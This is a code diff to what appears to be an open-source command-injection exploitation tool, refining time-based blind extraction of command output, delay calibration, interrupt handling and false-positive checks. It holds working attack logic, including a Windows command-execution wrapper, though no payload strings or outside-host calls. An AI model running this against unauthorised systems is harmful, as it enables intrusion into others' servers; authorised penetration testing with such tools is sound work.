@@ -44,13 +44,11 @@ from src.thirdparty.six.moves import html_parser as _html_parser
 from src.thirdparty.colorama import Fore, Back, Style, init
 
 """
-Abort a thread pool without waiting for running workers.
+Abort the thread pool on SystemExit; KeyboardInterrupt is handled by the caller.
 """
 def _abort_executor(executor, exc):
   executor.shutdown(wait=False, cancel_futures=True)
-  if isinstance(exc, SystemExit):
-    os._exit(exc.code if isinstance(exc.code, int) else 0)
-  os._exit(130)
+  os._exit(exc.code if isinstance(exc.code, int) else 0)
 
 """
 The main time-realative command injection exploitation.
@@ -139,29 +137,23 @@ def time_related_injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespa
       if settings.VERBOSITY_LEVEL == 0:
         settings.print_data_to_stdout(" (done)")
 
-  # Once per run, warn if the connection is already too jittery to trust automatically -
-  # and flag the result as suspect too, not just the message shown before it.
+  # Flags this run's output as suspect if the connection is (or was already found to be) lagging.
   def _check_lagging():
     nonlocal length_suspect, lagging_detected
-    if settings.LAGGING_CHECKED:
-      return
-    settings.LAGGING_CHECKED = True
-    if len(settings.RESPONSE_TIMES) > 1 and statistics.pstdev(settings.RESPONSE_TIMES) > settings.WARN_TIME_STDEV:
-      length_suspect = lagging_detected = settings.JITTER_SEEN = True
-      warn_msg = "Detected considerable lagging in the connection response(s). "
-      warn_msg += "Consider using a higher '--time-sec' value (e.g. '5' or more)."
-      settings.print_data_to_stdout(settings.print_critical_msg(warn_msg))
+    if checks.check_lagging():
+      length_suspect = lagging_detected = True
 
   # Guard timesec so concurrent payloads use the same value for sending and validation.
   timesec_lock = threading.Lock()
 
-  # Shrink the delay once a smaller one keeps reading as clearly delayed, not on one lucky read.
+  # Shrink the delay on a clearly-good read, but never below the same safety floor the initial calibration used.
   delay_candidates = [0] * settings.TIME_DELAY_CANDIDATES
+  min_safe_timesec = checks.time_related_timesec()
   def _adjust_time_delay(exec_time, lower_limit):
     nonlocal timesec
     if settings.ADJUST_TIME_DELAY_DISABLED or settings.ADJUST_TIME_DELAY_CHOICE == False:
       return
-    candidate = settings.TIME_DELAY_STEP + int(round(lower_limit))
+    candidate = max(settings.TIME_DELAY_STEP + int(round(lower_limit)), min_safe_timesec)
     with timesec_lock:
       delay_candidates.insert(0, candidate)
       del delay_candidates[settings.TIME_DELAY_CANDIDATES:]
@@ -252,16 +244,24 @@ def time_related_injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespa
       def _bisect_length():
         lo = int(minlen) - 1
         hi = int(maxlen) - 1
-        # Confirm the upper-bound fast path twice to avoid locking in on one noisy hit.
-        if hi >= int(minlen) and _length_delayed(hi) and _length_delayed(hi):
-          return hi
+        # Confirm the upper-bound fast path twice, so Continue/verbosity resumes this same step.
+        while True:
+          try:
+            if hi >= int(minlen) and _length_delayed(hi) and _length_delayed(hi):
+              return hi
+            break
+          except KeyboardInterrupt:
+            checks.handle_exploitation_interrupt(filename, url)
         # A single value to find, nothing to distribute across threads - stays serial.
         while hi - lo > 1:
-          mid = (lo + hi) // 2
-          if _length_delayed(mid):
-            lo = mid
-          else:
-            hi = mid
+          try:
+            mid = (lo + hi) // 2
+            if _length_delayed(mid):
+              lo = mid
+            else:
+              hi = mid
+          except KeyboardInterrupt:
+            checks.handle_exploitation_interrupt(filename, url)
         return lo if lo >= int(minlen) else None
 
       output_length = _bisect_length()
@@ -294,14 +294,21 @@ def time_related_injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespa
 
         revalidations = 0
         original_timesec = timesec
-        while not _validate_boundary(output_length):
+        while True:
+          try:
+            validated = _validate_boundary(output_length)
+          except KeyboardInterrupt:
+            checks.handle_exploitation_interrupt(filename, url)
+            continue
+          if validated:
+            break
           was_jittery = settings.JITTER_SEEN
           settings.JITTER_SEEN = True
           settings.ADJUST_TIME_DELAY_DISABLED = True
           max_revalidations = settings.MAX_LENGTH_REVALIDATIONS * (3 if was_jittery else 1)
           if revalidations >= max_revalidations:
             length_suspect = True
-            # Give up on this delay rather than keep it permanently elevated.
+            # Escalation failed; revert instead of carrying the raised delay into later positions.
             timesec = settings.CALIBRATED_TIMESEC = original_timesec
             break
           revalidations += 1
@@ -351,9 +358,10 @@ def time_related_injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespa
     check_end = 0
     check_start = time.time()
     output = []
-    # Position -> resolved ordinal, shared by both the threaded and non-threaded loops -
-    # the single source of truth for the live progress display below.
+    # Position -> resolved ordinal (>= 0), shared by both loops; -1 marks "attempted, no delay found".
+    UNRESOLVED_POSITION = -1
     results_by_position = {}
+    failed_positions = set()
     if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
       base_progress_msg = "Retrieving the execution output."
     else:
@@ -369,18 +377,19 @@ def time_related_injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespa
     # Share confirmed ordinals across positions; use the observed charset when small enough, with full-range fallback.
     observed_chars = set()
     observed_count = [0]
+    char_frequency = {}
     observed_chars_lock = threading.Lock()
 
-    # Renders positions resolved so far in place (order-independent, since threaded
-    # completion order isn't position order), "_" for anything not resolved yet. Only
-    # shows up to the furthest position touched, windowed to PROGRESS_DISPLAY_WIDTH with
-    # ".." markers for a long value, instead of growing the line without bound.
+    # Renders positions resolved so far, order-independent: "_" not attempted, "?" no delay found.
     def _render_output_so_far():
       furthest = 0
       chars = []
       for pos in range(1, output_length + 1):
         ascii_char = results_by_position.get(pos)
-        if ascii_char is not None:
+        if ascii_char == UNRESOLVED_POSITION:
+          chars.append("?")
+          furthest = pos
+        elif ascii_char is not None:
           ch = chr(ascii_char)
           chars.append(ch if ch.isprintable() else " ")
           furthest = pos
@@ -429,7 +438,8 @@ def time_related_injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespa
     def _save_progress():
       if menu.options.ignore_session:
         return
-      resolved = dict((pos, ordinal) for pos, ordinal in results_by_position.items() if ordinal is not None)
+      resolved = dict((pos, ordinal) for pos, ordinal in results_by_position.items()
+                      if ordinal is not None and ordinal != UNRESOLVED_POSITION)
       if len(resolved) >= len(positions):
         value = "".join(chr(resolved[pos]) for pos in positions)
       else:
@@ -472,11 +482,32 @@ def time_related_injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespa
       def _bisect_chars(force_full=False):
         lo = min_ord - 1
         hi = max_ord
-        # Confirm the upper-bound fast path twice to avoid locking in on one noisy hit.
-        if _char_delayed(hi) and _char_delayed(hi):
-          return hi
+        # Confirm the fast path twice; threaded mode re-raises so only the main thread prompts.
+        while True:
+          try:
+            if _char_delayed(hi) and _char_delayed(hi):
+              return hi, True
+            break
+          except KeyboardInterrupt:
+            if threaded:
+              raise
+            checks.handle_exploitation_interrupt(filename, url)
 
         if not force_full:
+          # Probe frequent characters first; skewed distributions can resolve positions in a few requests.
+          with observed_chars_lock:
+            top_candidates = sorted(char_frequency, key=char_frequency.get, reverse=True)[:settings.FREQUENCY_PROBE_TOP_K]
+          for candidate in top_candidates:
+            while True:
+              try:
+                if _char_delayed(candidate, operator="-eq"):
+                  return candidate, False
+                break
+              except KeyboardInterrupt:
+                if threaded:
+                  raise
+                checks.handle_exploitation_interrupt(filename, url)
+
           with observed_chars_lock:
             eligible = (observed_count[0] >= settings.NARROWING_MIN_OBSERVED
                         and len(observed_chars) <= settings.NARROWING_MAX_SET_SIZE)
@@ -485,25 +516,35 @@ def time_related_injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespa
             # Binary-search the narrowed set by index; keep hi as an exclusive sentinel.
             nlo, nhi = -1, len(narrowed)
             while nhi - nlo > 1:
-              nmid = (nlo + nhi) // 2
-              if _char_delayed(narrowed[nmid]):
-                nlo = nmid
-              else:
-                nhi = nmid
+              try:
+                nmid = (nlo + nhi) // 2
+                if _char_delayed(narrowed[nmid]):
+                  nlo = nmid
+                else:
+                  nhi = nmid
+              except KeyboardInterrupt:
+                if threaded:
+                  raise
+                checks.handle_exploitation_interrupt(filename, url)
             if nlo >= 0:
               # The value may be outside this set; boundary validation catches and escalates misses.
-              return narrowed[nlo]
+              return narrowed[nlo], False
 
         # Keep each character's bisection serial; threads only process different positions concurrently.
         while hi - lo > 1:
-          mid = (lo + hi) // 2
-          if _char_delayed(mid):
-            lo = mid
-          else:
-            hi = mid
-        return lo if lo >= min_ord else None
+          try:
+            mid = (lo + hi) // 2
+            if _char_delayed(mid):
+              lo = mid
+            else:
+              hi = mid
+          except KeyboardInterrupt:
+            if threaded:
+              raise
+            checks.handle_exploitation_interrupt(filename, url)
+        return (lo, True) if lo >= min_ord else (None, True)
 
-      ascii_char = _bisect_chars()
+      ascii_char, from_full_range = _bisect_chars()
 
       if ascii_char is not None:
         # Re-probe with equality before accepting - one request when clean,
@@ -516,14 +557,30 @@ def time_related_injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespa
 
         revalidations = 0
         original_timesec = timesec
-        while not _validate_char_boundary(ascii_char):
+        while True:
+          try:
+            validated = _validate_char_boundary(ascii_char)
+          except KeyboardInterrupt:
+            if threaded:
+              raise
+            checks.handle_exploitation_interrupt(filename, url)
+            continue
+          if validated:
+            break
+          if not from_full_range:
+            # Re-search the full range before treating a narrowed-set miss as timing noise.
+            ascii_char, from_full_range = _bisect_chars(force_full=True)
+            if ascii_char is None:
+              conn_error_flag = True
+              break
+            continue
           was_jittery = settings.JITTER_SEEN
           settings.JITTER_SEEN = True
           settings.ADJUST_TIME_DELAY_DISABLED = True
           max_revalidations = settings.MAX_LENGTH_REVALIDATIONS * (3 if was_jittery else 1)
           if revalidations >= max_revalidations:
             conn_error_flag = True
-            # Give up on this delay rather than keep it permanently elevated.
+            # Escalation failed; revert instead of carrying the raised delay into later positions.
             with timesec_lock:
               timesec = settings.CALIBRATED_TIMESEC = original_timesec
             break
@@ -537,9 +594,7 @@ def time_related_injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespa
               new_timesec = timesec
             warn_msg = "Increasing time delay to " + str(new_timesec) + " second" + ("s" if new_timesec > 1 else "") + "."
             settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
-          # A rejected value may have come from the narrowed set missing the real
-          # character - escalate to the full range rather than retrying the same guess.
-          ascii_char = _bisect_chars(force_full=True)
+          ascii_char, from_full_range = _bisect_chars(force_full=True)
           if ascii_char is None:
             conn_error_flag = True
             break
@@ -549,6 +604,7 @@ def time_related_injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespa
         with observed_chars_lock:
           observed_chars.add(ascii_char)
           observed_count[0] += 1
+          char_frequency[ascii_char] = char_frequency.get(ascii_char, 0) + 1
 
       return ascii_char, conn_error_flag
 
@@ -578,51 +634,75 @@ def time_related_injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespa
     # Asked once already in do_time_related_proccess(), before this ever runs.
     threaded = settings.THREADS > 1 and _THREADS_SUPPORTED and settings.THREADED_TIME_RETRIEVAL_CHOICE != False
     if not threaded:
-      try:
-        for pos in positions_to_extract:
-          _, ascii_char, conn_error_flag = _extract_position(pos)
-          results_by_position[pos] = ascii_char
-          if conn_error_flag:
-            conn_error_positions.add(pos)
-          if ascii_char is not None:
+      remaining = positions_to_extract
+      while remaining:
+        try:
+          for pos in remaining:
+            _, ascii_char, conn_error_flag = _extract_position(pos)
+            if ascii_char is None:
+              failed_positions.add(pos)
+            results_by_position[pos] = UNRESOLVED_POSITION if ascii_char is None else ascii_char
+            if conn_error_flag:
+              conn_error_positions.add(pos)
             _print_progress()
-      except (KeyboardInterrupt, SystemExit):
-        _save_progress()
-        raise
+          remaining = []
+        except SystemExit:
+          _save_progress()
+          raise
+        except KeyboardInterrupt:
+          # Defensive fallback - should already be absorbed inside _bisect_once()/_bisect_chars().
+          _save_progress()
+          checks.handle_exploitation_interrupt(filename, url)
+          remaining = [pos for pos in positions_to_extract if results_by_position.get(pos) is None]
     else:
       # Extract positions concurrently - never more workers than positions to fill.
-      num_workers = min(settings.THREADS, len(positions_to_extract)) or 1
-      executor = concurrent.futures.ThreadPoolExecutor(max_workers=num_workers)
-      try:
-        futures = {executor.submit(_extract_position, pos): pos for pos in positions_to_extract}
-        for future in concurrent.futures.as_completed(futures):
-          pos, ascii_char, conn_error_flag = future.result()
-          results_by_position[pos] = ascii_char
-          if conn_error_flag:
-            conn_error_positions.add(pos)
-          if ascii_char is not None:
+      remaining = positions_to_extract
+      while remaining:
+        num_workers = min(settings.THREADS, len(remaining)) or 1
+        executor = concurrent.futures.ThreadPoolExecutor(max_workers=num_workers)
+        try:
+          futures = {executor.submit(_extract_position, pos): pos for pos in remaining}
+          for future in concurrent.futures.as_completed(futures):
+            pos, ascii_char, conn_error_flag = future.result()
+            if ascii_char is None:
+              failed_positions.add(pos)
+            results_by_position[pos] = UNRESOLVED_POSITION if ascii_char is None else ascii_char
+            if conn_error_flag:
+              conn_error_positions.add(pos)
             _print_progress()
-      except (KeyboardInterrupt, SystemExit) as exc:
-        # _abort_executor() below hard-exits the process - save must happen first.
-        _save_progress()
-        _abort_executor(executor, exc)
-      else:
-        executor.shutdown(wait=True)
-    # Assemble in position order - covers positions resolved just now as well as
-    # any pre-seeded by _load_partial_progress().
+        except SystemExit as exc:
+          # Already means "leave now" (e.g. checks.quit()) - no prompting.
+          _save_progress()
+          _abort_executor(executor, exc)
+        except KeyboardInterrupt:
+          # wait=True lets in-flight workers finish, so nothing races the retry below.
+          executor.shutdown(wait=True, cancel_futures=True)
+          _save_progress()
+          checks.handle_exploitation_interrupt(filename, url)
+          remaining = [pos for pos in positions_to_extract if results_by_position.get(pos) is None]
+        else:
+          executor.shutdown(wait=True)
+          remaining = []
+    # Assemble in position order; unresolved positions are dropped, not filled with a placeholder.
     for pos in positions:
       ascii_char = results_by_position.get(pos)
-      if ascii_char is not None:
+      if ascii_char is not None and ascii_char != UNRESOLVED_POSITION:
         output.append(chr(ascii_char))
 
-    # Severe instability converges on the pool's upper bound, coincides with a visible
-    # connection error, or the connection was already confirmed too laggy to trust.
+    # Severe instability converges on the pool's upper bound - >= 1, not >= 2, since a single occurrence already means wrong data.
     boundary_char = chr(max(settings.CHAR_POOL_MULTI))
-    if output.count(boundary_char) >= 2 or conn_error_positions or lagging_detected:
+    if output.count(boundary_char) >= 1 or conn_error_positions or lagging_detected:
       if threaded:
         warn_msg = "Concurrent (threaded) requests overloading the target may have corrupted the extracted data. Consider re-running with '--threads=1' to confirm it."
       else:
         warn_msg = "Connection instability with the target may have corrupted the extracted data. Consider re-running to confirm it."
+      settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
+
+    if failed_positions:
+      warn_msg = str(len(failed_positions)) + " of " + str(len(positions)) + " character"
+      warn_msg += "s"[len(positions) == 1:] + " could not be extracted (no delay was ever observed for "
+      warn_msg += ("them" if len(failed_positions) != 1 else "it") + ") - the retrieved output below is missing "
+      warn_msg += ("those characters" if len(failed_positions) != 1 else "that character") + "."
       settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
 
     check_end  = time.time()
@@ -696,13 +776,62 @@ def results_based_injection(separator, TAG, cmd, prefix, suffix, whitespace, htt
 """
 False-positive check and evaluation.
 """
-def false_positive_check(separator, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, randvcalc, alter_shell, exec_time, url_time_response, false_positive_warning, technique, retry_attempt=None, retry_total=None):
+def false_positive_check(separator, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, randvcalc, alter_shell, exec_time, url_time_response, false_positive_warning, technique, retry_attempt=None, retry_total=None, silent=False):
 
   if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
     from src.core.injections.blind.techniques.time_based import tb_payloads as payloads
   else:
     from src.core.injections.semiblind.techniques.tempfile_based import tfb_payloads as payloads
-  
+
+  # silent=True skips the detection-phase chatter for a resume re-verify.
+  if not silent:
+    checks.check_for_false_positive_result(false_positive_warning)
+
+  # Varying the sleep time.
+  if false_positive_warning:
+    timesec = timesec + random.randint(3, 5)
+
+  # Verify the oracle with known logical properties; any failed relationship invalidates the round.
+  if settings.TARGET_OS != settings.OS.WINDOWS and not alter_shell:
+    a, c, b = sorted(random.sample(range(1, 50), 3))
+    # End on a must-delay check; the caller re-validates the final exec_time.
+    litmus_checks = [
+      (str(a) + " -eq " + str(a), True),
+      (str(a) + " -eq " + str(c), None),   # discarded - lets the backend settle after any earlier delay
+      (str(a) + " -eq " + str(b), False),
+      (str(b) + " -eq " + str(c), False),
+      (str(b) + " " + str(c), False),       # not a valid test expression
+      (str(c) + " -eq " + str(c), True),
+    ]
+    verified = True
+    for condition, expect in litmus_checks:
+      payload = payloads.condition_check(separator, condition, timesec, http_request_method)
+      if payload is None:
+        verified = False
+        break
+      if not silent and settings.VERBOSITY_LEVEL == 0:
+        settings.print_data_to_stdout(".")
+      before = settings.TOTAL_OF_REQUESTS
+      exec_time, vuln_parameter, _, prefix, suffix = requests.perform_injection(prefix, suffix, whitespace, payload, vuln_parameter, http_request_method, url)
+      if stability.request_was_retried(before):
+        verified = False
+        break
+      delayed = checks.time_related_shell(url_time_response, exec_time, timesec)
+      if not delayed:
+        checks.record_baseline_response_time(exec_time)
+      if expect is not None and delayed != expect:
+        verified = False
+        break
+
+    if verified:
+      if not silent and settings.VERBOSITY_LEVEL == 0:
+        settings.print_data_to_stdout(" (done)")
+      return exec_time, str(randvcalc)
+    else:
+      if not silent:
+        checks.unexploitable_point(retry_attempt, retry_total)
+      return exec_time, ""
+
   if settings.TARGET_OS == settings.OS.WINDOWS:
     previous_cmd = cmd
     if alter_shell:
@@ -716,15 +845,9 @@ def false_positive_check(separator, TAG, cmd, prefix, suffix, whitespace, timese
       else:
         cmd = "powershell.exe -InputFormat none write-host ([string](cmd /c " + cmd + ")).trim()"
 
-  checks.check_for_false_positive_result(false_positive_warning)
-
-  # Varying the sleep time.
-  if false_positive_warning:
-    timesec = timesec + random.randint(3, 5)
-
   # The verified value is always a single digit (see handler.py's randv1/randv2 ranges), so its output length is always 1.
   output_length = 1
-  if settings.VERBOSITY_LEVEL == 0:
+  if not silent and settings.VERBOSITY_LEVEL == 0:
     settings.print_data_to_stdout(".")
   if alter_shell:
     if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
@@ -737,19 +860,25 @@ def false_positive_check(separator, TAG, cmd, prefix, suffix, whitespace, timese
     else:
       payload = payloads.cmd_execution(separator, cmd, output_length, OUTPUT_TEXTFILE, timesec, http_request_method)
 
-  # Accept on the first delay seen across a bounded number of tries.
+  # Requires the delay twice in a row before accepting - one stray slow response is cheap, two isn't.
   def _retry_confirm(payload):
     nonlocal exec_time, vuln_parameter, prefix, suffix
+    consecutive_hits = 0
     for attempt in range(settings.FALSE_POSITIVE_RETRIES):
       before = settings.TOTAL_OF_REQUESTS
-      # Discard the returned payload - prefixes() re-prepends onto it, so feeding it
-      # back in would compound the prefix by one more "prefix" on every retry.
+      # Discard the returned payload - prefixes() re-prepending onto it would compound on every retry.
       exec_time, vuln_parameter, _, prefix, suffix = requests.perform_injection(prefix, suffix, whitespace, payload, vuln_parameter, http_request_method, url)
       if stability.request_was_retried(before):
         continue
       if checks.time_related_shell(url_time_response, exec_time, timesec):
-        return True
-      checks.record_baseline_response_time(exec_time)
+        consecutive_hits += 1
+        # Let the backend's own cooldown pass before trusting the next timing read.
+        time.sleep(timesec)
+        if consecutive_hits >= 2:
+          return True
+      else:
+        consecutive_hits = 0
+        checks.record_baseline_response_time(exec_time)
     return False
 
   found_chars = _retry_confirm(payload)
@@ -761,7 +890,7 @@ def false_positive_check(separator, TAG, cmd, prefix, suffix, whitespace, timese
     output = []
     # The verified value is always in 1-7 (see handler.py's randv1/randv2 ranges).
     for ascii_char in range(1, 8):
-      if settings.VERBOSITY_LEVEL == 0:
+      if not silent and settings.VERBOSITY_LEVEL == 0:
         settings.print_data_to_stdout(".")
       if alter_shell:
         if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
@@ -780,15 +909,17 @@ def false_positive_check(separator, TAG, cmd, prefix, suffix, whitespace, timese
     output = "".join(str(p) for p in output)
 
     if str(output) == str(randvcalc):
-      if settings.VERBOSITY_LEVEL == 0:
+      if not silent and settings.VERBOSITY_LEVEL == 0:
         settings.print_data_to_stdout(" (done)")
       return exec_time, output
     else:
-      checks.unexploitable_point(retry_attempt, retry_total)
+      if not silent:
+        checks.unexploitable_point(retry_attempt, retry_total)
       return exec_time, ""
 
   else:
-    checks.unexploitable_point(retry_attempt, retry_total)
+    if not silent:
+      checks.unexploitable_point(retry_attempt, retry_total)
     return exec_time, ""
 
 """
@@ -814,14 +945,14 @@ def select_output_filename(technique, tmp_path, TAG, prompt=True):
 
   while prompt:
     message = "Do you want to use a random file '" + OUTPUT_TEXTFILE 
-    message += "' to receive the command execution output? [Y/n] > "
+    message += "' to receive the command execution output? [Y/n] "
     procced_option = common.read_input(message, default="Y", check_batch=True)
 
     if procced_option in settings.CHOICE_YES:
       break
 
     elif procced_option in settings.CHOICE_NO:
-      message = "Enter a filename to receive the command execution output > "
+      message = "Enter a filename to receive the command execution output "
       message = common.read_input(message, default=OUTPUT_TEXTFILE, check_batch=True)
 
       OUTPUT_TEXTFILE = message
@@ -884,14 +1015,14 @@ def injection_output(url, OUTPUT_TEXTFILE, timesec, technique):
           settings.RECHECK_FILE_FOR_EXTRACTION = True
         while True:
           message =  "Do you want to use the URL '" + output
-          message += "' to receive the command execution output? [Y/n] > "
+          message += "' to receive the command execution output? [Y/n] "
           procced_option = common.read_input(message, default="Y", check_batch=True)
           if procced_option in settings.CHOICE_YES:
             settings.DEFINED_WEBROOT = output
             break
           elif procced_option in settings.CHOICE_NO:
             message =  "Enter URL to receive "
-            message += "the command execution output > "
+            message += "the command execution output "
             message = common.read_input(message, default=output, check_batch=True)
             if not re.search(r'^(?:http)s?://', message, re.I):
               common.invalid_option(message)
